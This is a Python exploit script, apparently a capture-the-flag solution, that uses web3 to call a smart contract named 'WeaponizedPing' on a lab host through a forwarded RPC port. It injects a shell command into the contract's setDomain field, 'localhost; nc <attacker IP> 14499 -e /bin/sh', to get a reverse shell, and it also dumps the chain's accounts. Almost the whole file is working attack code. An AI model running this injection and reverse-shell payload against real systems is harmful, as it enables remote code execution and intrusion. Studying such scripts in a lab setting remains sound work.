#!/usr/bin/env python3
# -*- encoding:utf-8 -*-
#
# Licensed under AGPL v3
# Copyright(C) 2019 kmahyyg
#

from web3 import Web3
import logging
import json
import sys

logger = logging.getLogger('default_log')
handler = logging.StreamHandler()
formatter = logging.Formatter("%(levelname)s | %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# SSH Port Forward: localhost:8545:10.10.10.142:9810
ethneturl = "http://localhost:8545"
logger.info("The 10.10.10.142:9810 should be forwarded to {localip}".format(localip=ethneturl))

# predenfined contract address read from the file
predefined_cont_addr = Web3.toChecksumAddress("0x3C0451Ecf8fC0DF1170F2F14522c107cB02BF54B")
logger.info("YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!")
input("Please confirm the above notification, then press enter to continue")

# Attacker info
AttackHost = "10.10.16.80"
AttackPort = "14499"
AttackPayload = "localhost; nc " + AttackHost + " " + AttackPort + " -e /bin/sh"

# Web3Py related code
w3eng = Web3(Web3.HTTPProvider(ethneturl))

network_status = w3eng.isConnected()
logger.info("Check if connected: " + str(network_status))
if not network_status:
    print("System network does not connect.")
    sys.exit(1)

# --- Learning and Testing Code ---
# --- Should be commented when finally use ---

# Dump the private chain accounts
logger.info("Trying to dump the accounts...")
all_acc = w3eng.eth.accounts
# logger.info("Trying to get balance of each account...")
# for accidx in range(0, len(all_acc)):
#     print("{par1}: {par2}".format(par1=str(all_acc[accidx]), par2=w3eng.eth.getBalance(all_acc[accidx])))

# --- Learning and Testing Code End ---

# According to Solidity compiler document, for new contract, must: account == 0
# construct new contract OR Using the existing contract

# set pre-funded account as sender
w3eng.eth.defaultAccount = all_acc[0]  # if new contract, account = 0
# Read contract ABI from json
cont_json = open('assets/WeaponizedPing.json', 'r').read()
cont_json = json.loads(cont_json)
cur_abi = cont_json['abi']
cur_cont_addr = predefined_cont_addr

cur_cont = w3eng.eth.contract(address=cur_cont_addr, abi=cur_abi)
cur_cont_funcs = cur_cont.functions
logger.info("Get Contract Functions: " + str(cur_cont_funcs))

# RCE
exploit = cur_cont_funcs.setDomain(AttackPayload).transact()
logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit))
logger.info("Waiting for transaction to be mined...")
receipt = w3eng.eth.waitForTransactionReceipt(exploit)
print("Receipt Found: ", sep='')
print(w3eng.eth.getTransactionReceipt(exploit))
finalres = cur_cont.functions.getDomain().call()
logger.info("Payload returned back is: " + finalres)
logger.info("DONE! You should get reverse shell now.")
